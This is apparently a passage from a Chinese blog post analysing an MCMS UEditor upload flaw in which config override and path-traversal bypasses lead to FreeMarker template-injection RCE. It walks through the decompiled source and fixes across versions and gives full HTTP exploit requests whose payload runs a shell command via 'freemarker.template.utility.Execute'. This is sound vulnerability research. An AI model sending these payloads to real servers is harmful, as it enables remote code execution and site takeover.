<span class="keyword">this</span>.contextPath = request.getContextPath();</span><br><span class="line">    <span class="keyword">this</span>.configManager = ConfigManager.getInstance(<span class="keyword">this</span>.rootPath, <span class="keyword">this</span>.contextPath, request.getRequestURI());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来回到<code>MsUeditorActionEnter</code>构造函数处理过程，紧接着调用了<code>this.getConfigManager()</code>初始化一些上传配置，而这个配置来源于文件<code>static/plugins/ueditor/1.4.3.3/jsp/config.json</code>，这个配置文件对上传做了限制，包括保存文件路径模板、大小、允许的后缀等，感兴趣的可以自己看看这个初始化过程，因为不太关键这里就不多叙述</p><p>在这里可以看到存在一个参数覆盖的问题(jsonConfig来源于web参数)，可以由自定义的输入覆盖默认配置，具体覆盖什么配置待会儿会说</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">MsUeditorActionEnter</span><span class="params">(HttpServletRequest request, String rootPath, String jsonConfig, String configPath)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(request, rootPath);</span><br><span class="line">    <span class="keyword">if</span> (jsonConfig != <span class="keyword">null</span> &amp;&amp; !jsonConfig.trim().equals(<span class="string">&quot;&quot;</span>) &amp;&amp; jsonConfig.length() &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.setConfigManager(ConfigManager.getInstance(configPath, request.getContextPath(), request.getRequestURI()));</span><br><span class="line">        ConfigManager config = <span class="keyword">this</span>.getConfigManager();</span><br><span class="line">        setValue(config, <span class="string">&quot;rootPath&quot;</span>, rootPath);</span><br><span class="line">        JSONObject _jsonConfig = <span class="keyword">new</span> JSONObject(jsonConfig);</span><br><span class="line">        JSONObject jsonObject = config.getAllConfig();</span><br><span class="line">        Iterator iterator = _jsonConfig.keys();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(iterator.hasNext()) &#123;</span><br><span class="line">            String key = (String)iterator.next();</span><br><span class="line">            jsonObject.put(key, _jsonConfig.get(key));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来初始化后调用exec方法，这里callback是否传入对我们不是很重要，继续看invoke方法</p><p>根据我们之前传入的actionType决定走入哪个分支</p><p>可以看到一共有8种类型，对应了不同的漏洞点，因为我们<code>只关心RCE</code>，所以这里就以上传为例，选择uploadfile</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.put(<span class="string">&quot;config&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">this</span>.put(<span class="string">&quot;uploadimage&quot;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">this</span>.put(<span class="string">&quot;uploadscrawl&quot;</span>, <span class="number">2</span>);</span><br><span class="line"><span class="keyword">this</span>.put(<span class="string">&quot;uploadvideo&quot;</span>, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">this</span>.put(<span class="string">&quot;uploadfile&quot;</span>, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">this</span>.put(<span class="string">&quot;catchimage&quot;</span>, <span class="number">5</span>);</span><br><span class="line"><span class="keyword">this</span>.put(<span class="string">&quot;listfile&quot;</span>, <span class="number">6</span>);</span><br><span class="line"><span class="keyword">this</span>.put(<span class="string">&quot;listimage&quot;</span>, <span class="number">7</span>);</span><br></pre></td></tr></table></figure><p>在之后调用<code>(new Uploader(this.request, conf)).doExec()</code>做处理，这里的参数走向我们同样不在乎随便选择一个即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> State <span class="title">doExec</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    String filedName = (String)<span class="keyword">this</span>.conf.get(<span class="string">&quot;fieldName&quot;</span>);</span><br><span class="line">    State state = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;true&quot;</span>.equals(<span class="keyword">this</span>.conf.get(<span class="string">&quot;isBase64&quot;</span>))) &#123;</span><br><span class="line">        state = Base64Uploader.save(<span class="keyword">this</span>.request.getParameter(filedName), <span class="keyword">this</span>.conf);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        state = BinaryUploader.save(<span class="keyword">this</span>.request, <span class="keyword">this</span>.conf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> state;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>省略其中的不关键的部分，这里我们只需要关注最终保存路径的生成即可</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">String savePath = (String)conf.get(<span class="string">&quot;savePath&quot;</span>);</span><br><span class="line">String originFileName = fileStream.getName();</span><br><span class="line">String suffix = FileType.getSuffixByFilename(originFileName);</span><br><span class="line">originFileName = originFileName.substring(<span class="number">0</span>, originFileName.length() - suffix.length());</span><br><span class="line">savePath = savePath + suffix;</span><br><span class="line"><span class="keyword">long</span> maxSize = (Long)conf.get(<span class="string">&quot;maxSize&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!validType(suffix, (String[])((String[])conf.get(<span class="string">&quot;allowFiles&quot;</span>)))) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> BaseState(<span class="keyword">false</span>, <span class="number">8</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    savePath = PathFormat.parse(savePath, originFileName);</span><br><span class="line">    String physicalPath = (String)conf.get(<span class="string">&quot;rootPath&quot;</span>) + savePath;</span><br><span class="line">    InputStream is = fileStream.openStream();</span><br><span class="line">    State storageState = StorageManager.saveFileByInputStream(is, physicalPath, maxSize);</span><br><span class="line">    is.close();</span><br><span class="line">    <span class="keyword">if</span> (storageState.isSuccess()) &#123;</span><br><span class="line">        storageState.putInfo(<span class="string">&quot;url&quot;</span>, PathFormat.format(savePath));</span><br><span class="line">        storageState.putInfo(<span class="string">&quot;type&quot;</span>, suffix);</span><br><span class="line">        storageState.putInfo(<span class="string">&quot;original&quot;</span>, originFileName + suffix);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">... </span><br></pre></td></tr></table></figure><ol><li>从配置获取保存的路径</li><li>从Multipart解析文件后缀拼接</li><li>使用PathFormat.parse处理替换模板标签内容</li><li>与根路径拼接并写入文件</li></ol><p>在<code>com.baidu.ueditor.PathFormat#parse</code>的处理过程当中会对filename中字符做替换，导致<code>/</code>字符丢失因此不能从filename控制路径的穿越</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename = filename.replace(<span class="string">&quot;$&quot;</span>, <span class="string">&quot;\\$&quot;</span>).replaceAll(<span class="string">&quot;[\\/:*?\&quot;&lt;&gt;|]&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br></pre></td></tr></table></figure><p>因此我们只能通过控制<code>savePath</code>实现完整的路径控制(还记得么，上面一开始提到过可以做参数覆盖)，对于我们的uploadfile的action，对应的savepath属性为filePathFormat，因此构造，当然也可以覆盖其他属性参数这里不重复</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Ps:&#123;&#123;url()&#125;是yakit的url编码的标签</span><br><span class="line">POST /<span class="keyword">static</span>/plugins/ueditor/<span class="number">1.4</span><span class="number">.3</span><span class="number">.3</span>/jsp/editor.<span class="keyword">do</span>?jsonConfig=&#123;&#123;url(&#123;filePathFormat:<span class="string">&#x27;/template/1/default/2&#x27;</span>&#125;)&#125;&#125;&amp;action=uploadfile  HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8079</span></span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Length: 362</span></span><br><span class="line"><span class="comment">Content-Type: multipart/form-data; boundary=------------------------AuIwirENRLZwUJSzValDLkEbUhZbrxlJuvZrhFXA</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span></span><br><span class="line"><span class="comment">X_Requested_With: UTF-8</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">--------------------------AuIwirENRLZwUJSzValDLkEbUhZbrxlJuvZrhFXA</span></span><br><span class="line"><span class="comment">Content-Disposition: form-data; name=&quot;upload&quot;; filename=&quot;1.txt&quot;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;#assign value=&quot;freemarker.template.utility.Execute&quot;?new()&gt;$&#123;value(&quot;open -na Calculator&quot;)&#125;</span></span><br><span class="line"><span class="comment">--------------------------AuIwirENRLZwUJSzValDLkEbUhZbrxlJuvZrhFXA--</span></span><br></pre></td></tr></table></figure><h3 id="V-lt-5-2-8"><a href="#V-lt-5-2-8" class="headerlink" title="V&lt;=5.2.8"></a>V&lt;=5.2.8</h3><p>接下来我们看看开发是如何修复这个问题的，这里我的环境是5.2.8，这一次开发意识到了问题所在，做了两个步骤的修复</p><ol><li>rootPath由程序控制在必须为upload目录下</li><li>对每一个路径配置做了一次路径归一化</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">editor</span><span class="params">(HttpServletRequest request, HttpServletResponse response, String jsonConfig)</span> </span>&#123;</span><br><span class="line">    String uploadFloderPath = MSProperties.upload.path;</span><br><span class="line">    String rootPath = BasicUtil.getRealPath(uploadFloderPath);</span><br><span class="line">    jsonConfig = jsonConfig.replace(<span class="string">&quot;&#123;ms.upload&#125;&quot;</span>, <span class="string">&quot;/&quot;</span> + uploadFloderPath);</span><br><span class="line">    Map&lt;String, Object&gt; map = (Map)JSONObject.parse(jsonConfig);</span><br><span class="line">    String imagePathFormat = (String)map.get(<span class="string">&quot;imagePathFormat&quot;</span>);</span><br><span class="line">    imagePathFormat = FileUtil.normalize(imagePathFormat);</span><br><span class="line">    String filePathFormat = (String)map.get(<span class="string">&quot;filePathFormat&quot;</span>);</span><br><span class="line">    filePathFormat = FileUtil.normalize(filePathFormat);</span><br><span class="line">    String videoPathFormat = (String)map.get(<span class="string">&quot;videoPathFormat&quot;</span>);</span><br><span class="line">    videoPathFormat = FileUtil.normalize(videoPathFormat);</span><br><span class="line">    map.put(<span class="string">&quot;imagePathFormat&quot;</span>, imagePathFormat);</span><br><span class="line">    map.put(<span class="string">&quot;filePathFormat&quot;</span>, filePathFormat);</span><br><span class="line">    map.put(<span class="string">&quot;videoPathFormat&quot;</span>, videoPathFormat);</span><br><span class="line">    jsonConfig = JSONObject.toJSONString(map);</span><br><span class="line">    MsUeditorActionEnter actionEnter = <span class="keyword">new</span> MsUeditorActionEnter(request, rootPath, jsonConfig, BasicUtil.getRealPath(<span class="string">&quot;&quot;</span>));</span><br><span class="line">    String json = actionEnter.exec();</span><br><span class="line">    Map jsonMap = (Map)JSON.parseObject(json, Map.class);</span><br><span class="line">    jsonMap.put(<span class="string">&quot;url&quot;</span>, <span class="string">&quot;/&quot;</span>.concat(uploadFloderPath).concat(jsonMap.get(<span class="string">&quot;url&quot;</span>) + <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="keyword">return</span> JSONObject.toJSONString(jsonMap);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那是不是就没办法了呢？请独立思考三分钟</p><p>之前提到了在<code>PathFormat.parse</code>当中，有对最终路径当中的模板做替换(当然这里和老版本的逻辑不一样，简化了很多，分析时以当前版本为准，有兴趣可以看看老版)，可以看到会取{xxx}中的内容，之后调用getString做替换</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">parse</span><span class="params">(String input, String filename)</span> </span>&#123;</span><br><span class="line">    Pattern pattern = Pattern.compile(<span class="string">&quot;\\&#123;([^\\&#125;]+)\\&#125;&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    Matcher matcher = pattern.matcher(input);</span><br><span class="line">    String matchStr = <span class="keyword">null</span>;</span><br><span class="line">    currentDate = <span class="keyword">new</span> Date();</span><br><span class="line">    StringBuffer sb = <span class="keyword">new</span> StringBuffer();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(matcher.find()) &#123;</span><br><span class="line">        matchStr = matcher.group(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (matchStr.indexOf(<span class="string">&quot;filename&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">            filename = filename.replace(<span class="string">&quot;$&quot;</span>, <span class="string">&quot;\\$&quot;</span>).replaceAll(<span class="string">&quot;[\\/:*?\&quot;&lt;&gt;|]&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            matcher.appendReplacement(sb, filename);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            matcher.appendReplacement(sb, getString(matchStr));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    matcher.appendTail(sb);</span><br><span class="line">    <span class="keyword">return</span> sb.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到如果字符不在当前的case当中会直接返回</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">getString</span><span class="params">(String pattern)</span> </span>&#123;</span><br><span class="line">    pattern = pattern.toLowerCase();</span><br><span class="line">    <span class="keyword">if</span> (pattern.indexOf(<span class="string">&quot;time&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> getTimestamp();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pattern.indexOf(<span class="string">&quot;yyyy&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> getFullYear();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pattern.indexOf(<span class="string">&quot;yy&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> getYear();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pattern.indexOf(<span class="string">&quot;mm&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> getMonth();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pattern.indexOf(<span class="string">&quot;dd&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> getDay();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pattern.indexOf(<span class="string">&quot;hh&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> getHour();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pattern.indexOf(<span class="string">&quot;ii&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> getMinute();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pattern.indexOf(<span class="string">&quot;ss&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> getSecond();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> pattern.indexOf(<span class="string">&quot;rand&quot;</span>) != -<span class="number">1</span> ? getRandom(pattern) : pattern;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有了这个思路我们便可以构造如下payload绕过校验</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Ps:&#123;&#123;url()&#125;是yakit的url编码的标签</span><br><span class="line"><span class="keyword">POST</span> <span class="string">/static/plugins/ueditor/1.4.3.3/jsp/editor.do?jsonConfig=&#123;filePathFormat:&#x27;/&#123;.&#125;./template/1/default/2&#x27;&#125;&amp;action=uploadfile</span>  <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="string">Host:</span> 127.0.0.1:8080</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>362</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=------------------------AuIwirENRLZwUJSzValDLkEbUhZbrxlJuvZrhFXA</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line">X_Requested_With: UTF-8</span><br><span class="line"></span><br><span class="line"><span class="routeros">--------------------------AuIwirENRLZwUJSzValDLkEbUhZbrxlJuvZrhFXA</span></span><br><span class="line"><span class="routeros">Content-Disposition: form-data; <span class="attribute">name</span>=<span class="string">&quot;upload&quot;</span>; <span class="attribute">filename</span>=<span class="string">&quot;1.txt&quot;</span></span></span><br><span class="line"><span class="routeros"></span></span><br><span class="line"><span class="routeros">&lt;#assign <span class="attribute">value</span>=<span class="string">&quot;freemarker.template.utility.Execute&quot;</span>?new()&gt;$&#123;value(<span class="string">&quot;open -na Calculator&quot;</span>)&#125;</span></span><br><span class="line"><span class="routeros">--------------------------AuIwirENRLZwUJSzValDLkEbUhZbrxlJuvZrhFXA--</span></span><br></pre></td></tr></table></figure><h3 id="V-lt-5-3-5-目前最新版"><a href="#V-lt-5-3-5-目前最新版" class="headerlink" title="V&lt;=5.3.5(目前最新版)"></a>V&lt;=5.3.5(目前最新版)</h3><p>首先来看最新版做了哪些变动</p><ol><li>在最外层做了jsonConfig判断内容(似乎也没修复什么)</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">editor</span><span class="params">(HttpServletRequest request, HttpServletResponse response, String jsonConfig)</span> </span>&#123;</span><br><span class="line">    String uploadFolderPath = MSProperties.upload.path;</span><br><span class="line">    <span class="keyword">boolean</span> enableWeb = MSProperties.upload.enableWeb;</span><br><span class="line">    <span class="keyword">if</span> (!enableWeb) &#123;</span><br><span class="line">        HashMap&lt;String, String&gt; map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        map.put(<span class="string">&quot;state&quot;</span>, <span class="string">&quot;front end upload is not enabled&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> JSONUtil.toJsonStr(map);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        String rootPath = BasicUtil.getRealPath(uploadFolderPath);</span><br><span class="line">        jsonConfig = jsonConfig.replace(<span class="string">&quot;&#123;ms.upload&#125;&quot;</span>, <span class="string">&quot;/&quot;</span> + uploadFolderPath);</span><br><span class="line">        Map&lt;String, Object&gt; map = (Map)JSONUtil.toBean(jsonConfig, Map.class);</span><br><span class="line">        String imagePathFormat = (String)map.get(<span class="string">&quot;imagePathFormat&quot;</span>);</span><br><span class="line">        imagePathFormat = FileUtil.normalize(imagePathFormat);</span><br><span class="line">        String filePathFormat = (String)map.get(<span class="string">&quot;filePathFormat&quot;</span>);</span><br><span class="line">        filePathFormat = FileUtil.normalize(filePathFormat);</span><br><span class="line">        String videoPathFormat = (String)map.get(<span class="string">&quot;videoPathFormat&quot;</span>);</span><br><span class="line">        videoPathFormat = FileUtil.normalize(videoPathFormat);</span><br><span class="line">        map.put(<span class="string">&quot;imagePathFormat&quot;</span>, imagePathFormat);</span><br><span class="line">        map.put(<span class="string">&quot;filePathFormat&quot;</span>, filePathFormat);</span><br><span class="line">        map.put(<span class="string">&quot;videoPathFormat&quot;</span>, videoPathFormat);</span><br><span class="line">        jsonConfig = JSONUtil.toJsonStr(map);</span><br><span class="line">        <span class="keyword">if</span> (jsonConfig == <span class="keyword">null</span> || !jsonConfig.contains(<span class="string">&quot;../&quot;</span>) &amp;&amp; !jsonConfig.contains(<span class="string">&quot;..\\&quot;</span>)) &#123;</span><br><span class="line">            MsUeditorActionEnter actionEnter = <span class="keyword">new</span> MsUeditorActionEnter(request, rootPath, jsonConfig, BasicUtil.getRealPath(<span class="string">&quot;&quot;</span>));</span><br><span class="line">            String json = actionEnter.exec();</span><br><span class="line">            Map jsonMap = (Map)JSONUtil.toBean(json, Map.class);</span><br><span class="line">            jsonMap.put(<span class="string">&quot;url&quot;</span>, <span class="string">&quot;/&quot;</span>.concat(uploadFolderPath).concat(jsonMap.get(<span class="string">&quot;url&quot;</span>) + <span class="string">&quot;&quot;</span>));</span><br><span class="line">            <span class="keyword">return</span> JSONUtil.toJsonStr(jsonMap);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> BusinessException(BundleUtil.getString(<span class="string">&quot;net.mingsoft.base.resources.resources&quot;</span>, <span class="string">&quot;err.error&quot;</span>, <span class="keyword">new</span> String[]&#123;BundleUtil.getString(<span class="string">&quot;net.mingsoft.basic.resources.resources&quot;</span>, <span class="string">&quot;file.path&quot;</span>, <span class="keyword">new</span> String[<span class="number">0</span>])&#125;));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>禁止通过属性覆盖修改允许的后缀(我估计开发以为模板引擎必须要htm后缀才行了，忘记他自己写的函数是可以随意指定后缀了2333)，以及文件读取相关属性</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">MsUeditorActionEnter</span><span class="params">(HttpServletRequest request, String rootPath, String jsonConfig, String configPath)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(request, rootPath);</span><br><span class="line">        <span class="keyword">if</span> (jsonConfig != <span class="keyword">null</span> &amp;&amp; !jsonConfig.trim().equals(<span class="string">&quot;&quot;</span>) &amp;&amp; jsonConfig.length() &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.setConfigManager(ConfigManager.getInstance(configPath, request.getContextPath(), request.getRequestURI()));</span><br><span class="line">            ConfigManager config = <span class="keyword">this</span>.getConfigManager();</span><br><span class="line">            setValue(config, <span class="string">&quot;rootPath&quot;</span>, rootPath);</span><br><span class="line">            JSONObject _jsonConfig = <span class="keyword">new</span> JSONObject(jsonConfig);</span><br><span class="line">            _jsonConfig.remove(<span class="string">&quot;fileManagerAllowFiles&quot;</span>);</span><br><span class="line">            _jsonConfig.remove(<span class="string">&quot;imageManagerAllowFiles&quot;</span>);</span><br><span class="line">            _jsonConfig.remove(<span class="string">&quot;catcherAllowFiles&quot;</span>);</span><br><span class="line">            _jsonConfig.remove(<span class="string">&quot;imageAllowFiles&quot;</span>);</span><br><span class="line">            _jsonConfig.remove(<span class="string">&quot;fileAllowFiles&quot;</span>);</span><br><span class="line">            _jsonConfig.remove(<span class="string">&quot;videoAllowFiles&quot;</span>);</span><br><span class="line">            _jsonConfig.remove(<span class="string">&quot;imageManagerListPath&quot;</span>);</span><br><span class="line">            _jsonConfig.remove(<span class="string">&quot;fileManagerListPath&quot;</span>);</span><br><span class="line">            JSONObject jsonObject = config.getAllConfig();</span><br><span class="line">            Iterator iterator = _jsonConfig.keys();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(iterator.hasNext()) &#123;</span><br><span class="line">                String key = (String)iterator.next();</span><br><span class="line">                jsonObject.put(key, _jsonConfig.get(key));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>引擎解析测</li></ol><p>设置禁止加载任意类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cfg.setNewBuiltinClassResolver(TemplateClassResolver.ALLOWS_NOTHING_RESOLVER)</span><br></pre></td></tr></table></figure><p>但这样并不能完全修复问题，可以参考辅助学习(<a target="_blank" rel="noopener" 